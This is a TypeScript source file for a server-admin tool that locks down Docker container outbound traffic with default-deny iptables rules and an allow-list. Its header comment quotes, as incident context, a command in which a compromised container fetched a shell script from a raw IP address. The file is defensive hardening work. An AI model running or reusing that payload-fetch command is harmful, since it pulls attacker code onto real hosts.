import { z } from "zod";
import { withSession } from "../deps.js";
import { shq, lastLines } from "../util.js";
import type { ToolDef } from "./types.js";

const serverParam = z.string().optional().describe("Target server name. Omit to use the default.");
const CHAIN = "ADPIX_EGRESS";

/**
 * egress_lockdown — default-deny OUTBOUND for app containers with an allow-list (IR 3.4: the compromised
 * web container ran `wget http://77.90.13.20/1.sh` because container egress was wide open). Rules live in
 * the DOCKER-USER chain (the supported hook for filtering container-forwarded traffic): allow established,
 * DNS, and private/inter-container ranges + explicit allow-listed hosts; DROP everything else leaving via
 * the external interface. Container↔container, container↔host, and the datastores keep working; only
 * unsolicited egress to the internet is denied — so a code-exec bug can't pull a payload.
 *
 * report is read-only; apply/teardown change the firewall (confirm:true). Rules are runtime (not
 * persisted across reboot) — pair with the host firewall's persistence if you want them to survive.
 */
export const egressTools: ToolDef[] = [
  {
    name: "egress_lockdown",
    title: "Default-deny container egress with an allow-list (stops payload pulls)",
    description:
      "Lock down app-container OUTBOUND traffic so a code-exec bug can't fetch a payload (IR 3.4). action=report " +
      "(read-only) shows the current DOCKER-USER posture; action=apply (confirm) installs a default-deny egress " +
      "rule that still allows established connections, DNS, private/inter-container ranges, and any allowHosts you " +
      "list (resolved on the target); action=teardown (confirm) removes it. Best applied at RUNTIME (after " +
      "install/build, when the app no longer needs to pull). Rules are not reboot-persistent.",
    schema: {
      server: serverParam,
      action: z.enum(["report", "apply", "teardown"]).default("report"),
      allowHosts: z.array(z.string()).default([]).describe("Extra external hostnames the containers may reach (e.g. api.stripe.com) — resolved to IPs on the target and allow-listed"),
      confirm: z.boolean().default(false).describe("Required for apply / teardown"),
    },
    annotations: { destructiveHint: true, openWorldHint: true },
    handler: async (deps, args) => {
      const a = args as { server?: string; action: "report" | "apply" | "teardown"; allowHosts: string[]; confirm: boolean };
      return withSession(deps, a.server, async (s, srv) => {
        if (a.action === "report") {
          const r = await s.exec(
            `echo ===HOOK; iptables -C DOCKER-USER -j ${CHAIN} 2>/dev/null && echo installed || echo absent; ` +
            `echo ===RULES; iptables -S ${CHAIN} 2>/dev/null || echo "(no ${CHAIN} chain)"; ` +
            `echo ===EXT; ip route show default 2>/dev/null | awk '/default/{print $5; exit}'; ` +
            `echo ===DOCKERNET; docker network ls --format '{{.Name}}' 2>/dev/null | head`,
            { timeoutMs: 20_000 }
          );
          const sec: Record<string, string> = {}; let cur = "";
          for (const ln of r.stdout.split("\n")) { const m = ln.match(/^===(\w+)/); if (m) { cur = m[1]; sec[cur] = ""; } else if (cur) sec[cur] += ln + "\n"; }
          const on = (sec.HOOK || "").includes("installed");
          return [
            `# Egress posture — ${srv.name}`,
            `Default-deny egress: ${on ? "✅ ACTIVE" : "❌ NOT installed — containers can reach the whole internet (IR 3.4 risk)"}`,
            `External interface: ${(sec.EXT || "?").trim() || "?"}`,
            on ? `Current allow-list rules:\n${lastLines((sec.RULES || "").trim(), 12)}` : `Apply: egress_lockdown action=apply confirm:true  (add allowHosts:[…] for anything the app legitimately calls out to).`,
          ].join("\n\n");
        }

        if (!a.confirm) return `REFUSED: ${a.action} changes the host firewall (container egress). Re-run with confirm:true. (action=report is read-only.)`;

        if (a.action === "teardown") {
          const r = await s.exec(`iptables -D DOCKER-USER -j ${CHAIN} 2>/dev/null; iptables -F ${CHAIN} 2>/dev/null; iptables -X ${CHAIN} 2>/dev/null; echo done`, { timeoutMs: 20_000 });
          return `# Egress lockdown removed — ${srv.name}\nDOCKER-USER hook + ${CHAIN} chain flushed (exit ${r.code}). Containers can egress freely again.`;
        }

        // apply: resolve allow-listed hosts to IPs on the target, then build the chain
        const allowResolve = a.allowHosts.length
          ? `for h in ${a.allowHosts.map((h) => shq(h)).join(" ")}; do getent ahostsv4 "$h" 2>/dev/null | awk '{print $1}' | sort -u; done`
          : `true`;
        const script =
          `set -e; EXT=$(ip route show default | awk '/default/{print $5; exit}'); ` +
          `[ -n "$EXT" ] || { echo "no default route — aborting (would risk cutting the box off)"; exit 3; }; ` +
          `iptables -N ${CHAIN} 2>/dev/null || iptables -F ${CHAIN}; ` +
          `iptables -A ${CHAIN} -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN; ` +
          `iptables -A ${CHAIN} -p udp --dport 53 -j RETURN; iptables -A ${CHAIN} -p tcp --dport 53 -j RETURN; ` +
          `iptables -A ${CHAIN} -d 10.0.0.0/8 -j RETURN; iptables -A ${CHAIN} -d 172.16.0.0/12 -j RETURN; iptables -A ${CHAIN} -d 192.168.0.0/16 -j RETURN; ` +
          `for ip in $(${allowResolve}); do iptables -A ${CHAIN} -d "$ip" -j RETURN; done; ` +
          `iptables -A ${CHAIN} -o "$EXT" -j DROP; ` +                       // deny only traffic leaving the box
          `iptables -C DOCKER-USER -j ${CHAIN} 2>/dev/null || iptables -I DOCKER-USER -j ${CHAIN}; ` +
          `echo "EXT=$EXT"; iptables -S ${CHAIN} | wc -l`;
        const r = await s.exec(script, { timeoutMs: 30_000 });
        if (r.code !== 0) return `# Egress lockdown FAILED — ${srv.name}\n${lastLines(r.stdout + r.stderr, 8)}\n(No partial rule left dangling — teardown to be safe.)`;
        return [
          `# Egress lockdown ACTIVE — ${srv.name}`,
          `Container egress is now default-DENY on ${r.stdout.match(/EXT=(\S+)/)?.[1] || "the external interface"}.`,
          `Still allowed: established connections, DNS, private/inter-container ranges${a.allowHosts.length ? `, and ${a.allowHosts.join(", ")}` : ""}.`,
          `A code-exec bug in a container can no longer wget a payload from the internet (IR 3.4 closed).`,
          `Verify from a container: docker exec <c> wget -qO- http://1.1.1.1 (should hang/fail); a real dependency call should still work.`,
          `Rules are runtime-only — teardown with action=teardown; persist via your host firewall if wanted.`,
        ].join("\n");
      });
    },
  },
];
